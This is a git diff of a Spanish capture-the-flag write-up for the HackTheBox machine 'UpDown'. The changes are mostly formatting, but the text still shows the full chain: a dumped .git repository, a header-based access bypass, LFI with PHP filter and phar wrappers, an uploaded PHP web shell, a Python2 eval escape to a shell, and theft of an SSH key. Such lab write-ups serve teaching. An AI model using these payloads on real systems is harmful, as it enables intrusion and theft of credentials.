@@ -41,8 +41,8 @@ Como tenemos un .git lo sacaremos con git-dumper
 └─$ git-dumper http://siteisup.htb/dev/.git/ git
 ```
 Este repo de git aplica al subdominio "dev.siteisup" no al original:
-- changelog.txt -> "To-Do -> eliminar la opcion upload" vulnerable?
-Tabmien están *index.php* y *Checker.php*
+- changelog.txt -> "To-Do -> eliminar la opcion upload" vulnerable? 
+Tabmien están *index.php* y *Checker.php*  
 
 Si hacemos un git-log encontramos esta branch...
 ```console
@@ -62,8 +62,8 @@ diff --git a/.htaccess b/.htaccess
  Allow from env=Required-Header
 ```
 
-Esto lo que quiere decir esque /dev tiene que tener la cabecera "Special-Dev: only4dev" para que te de acceso.
-Una vez puesta esta cabecera con la extension "simply modify headers" ya nos aparece una web similar a la anterior
+Esto lo que quiere decir esque /dev tiene que tener la cabecera "Special-Dev: only4dev" para que te de acceso.  
+Una vez puesta esta cabecera con la extension "simply modify headers" ya nos aparece una web similar a la anterior.  
 ![updown2](https://user-images.githubusercontent.com/96772264/215056095-f26f1060-3c35-4c24-8f3c-64878b760a12.PNG)
 ![updown3](https://user-images.githubusercontent.com/96772264/215056155-4b24aab1-e820-4ef2-9395-e1d1697d5465.PNG)
 
@@ -84,11 +84,11 @@ El codigo del repo que nos hemos bajado y que concierne a esta parte:
 	// Si no ponemos ?page=admin nos carga checker.php
 ?>
 ```
-Por tanto si la url es: http://dev.siteisup.htb/?page=admin -> (mensaje cutre)
+Por tanto si la url es: http://dev.siteisup.htb/?page=admin -> (mensaje cutre)  
 Intentamos un LFI ya sabemos por el codigo de arriba que:
-- No podemos pedir nada que tenga -> /bin, usr, home, var, etc, i
-- Lo que pidamos le pondra la extension php
-- Si pedimos un php habra que poner el wrapper de codificacion en base64 porque si no lo interpreta.
+- No podemos pedir nada que tenga -> /bin, usr, home, var, etc, i  
+- Lo que pidamos le pondra la extension php  
+- Si pedimos un php habra que poner el wrapper de codificacion en base64 porque si no lo interpreta.  
 ```console
 └─$ curl -s -H "Special-Dev: only4dev" http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=checker | tail -n 1
 PD9waHAKaWYoRElSRUNUQUNDRVNTKXsKCWRpZSgiQWNjZXNzIERlbmllZCIpOwp9Cj8+CjwhRE9DVFlQR...
@@ -134,39 +134,35 @@ if($_POST['check']){
     @unlink($final_path);}
 ?>
 ```
-
 Si subo una lista de webs como me piden (webs.txt):
 ```
 http://localhost:80
 http://10.10.14.14
 http://10.10.14.14/test.txt
 ```
-Me llegan peticiones al igual que la web original.
-
+Me llegan peticiones al igual que la web original:  
 - Si cambio a webs.php -> extension not allowed  
-
-En /uploads/ encuentro un archivo md5 pero esta vacio.
-
-Si creamos un "<?php system($_GET['cmd']); ?>" y lo ponemos como shell.txt se sube pero obviamente no se ejecuta.
-```console
+En /uploads/ encuentro un archivo md5 pero esta vacio.  
+Si creamos un "<?php system($_GET['cmd']); ?>" y lo ponemos como shell.txt se sube pero obviamente no se ejecuta.  
+```console  
 └─$ zip shell.jpeg shell.php
 └─$ file shell.jpeg   
 shell.cucuxii: Zip archive data   # Aunque tenga la extension jpeg esto es un zip.
 ```
-En /uploads aparece un nuevo directorio -> 1526e941f20f74050a82951a5bda79e2, ahi dentro está shell.jpeg
+En /uploads aparece un nuevo directorio -> 1526e941f20f74050a82951a5bda79e2, ahi dentro está shell.jpeg  
 ![updown4](https://user-images.githubusercontent.com/96772264/215056204-2a60d2c2-4dab-41f3-9095-d4a337e0ae72.PNG)
 
-Si accedemos con phar por el lfi al archivo de dentro (shell.php que es shell porque concatena ello solo el .php)
+Si accedemos con phar por el lfi al archivo de dentro (shell.php que es shell porque concatena ello solo el .php)  
 ```console
 └─$ curl -s -H "Special-Dev: only4dev" 'http://dev.siteisup.htb/?page=phar://uploads/1526e941f20f74050a82951a5bda79e2/shell.jpeg/shell' -I
 HTTP/1.0 500 Internal Server Error
 ```
-El error 500 se debe a que hay una funcion prohibida.
-Si cambiamos su contenido a "<?php phpinfo(); ?>" y  repetimos el proceso tenemos el documento en la web:
+El error 500 se debe a que hay una funcion prohibida.  
+Si cambiamos su contenido a "<?php phpinfo(); ?>" y  repetimos el proceso tenemos el documento en la web:  
 
-Si copiamos las disabled functions las metemos en el archivo "disabled_functions" 
-y con vim sustituimos las , por retorno de carro -> :%s/,/\r/g acabamos con una lista bien clara de las 
-funciones prohibidas entre las que estan system, exec o shell_exec entre todas.
+Si copiamos las disabled functions las metemos en el archivo "disabled_functions" y con vim sustituimos las , por retorno de 
+carro -> ```:%s/,/\r/g``` acabamos con una lista bien clara de las funciones prohibidas entre las que estan system,
+exec o shell_exec entre todas.  
 ![updown5](https://user-images.githubusercontent.com/96772264/215056216-ec6cf51c-dfee-4718-8bf7-5e6c777f43f8.PNG)
 
 Esta es una lista de las funciones que nos permiten ejecutar comandos (lo metemos en un archivo llamado dangerous)
@@ -228,7 +224,8 @@ Welcome to 'siteisup.htb' application
 Enter URL here:__import__('os').system("bash")
 developer@updown:/home/developer/dev$ 
 ```
-
+Esta vulnerabilidad se acontece porque python2 cuando ejecuta input, le pasa su contenido a la funcion eval() que sirve
+para ejecutar codigo.
 Seguimos sin poder leer la user flag, asi que nos metemos al directorio .ssh de developer y copiamos la id_rsa
 ```console
 developer@updown:/home/developer/.ssh$ cat id_rsa
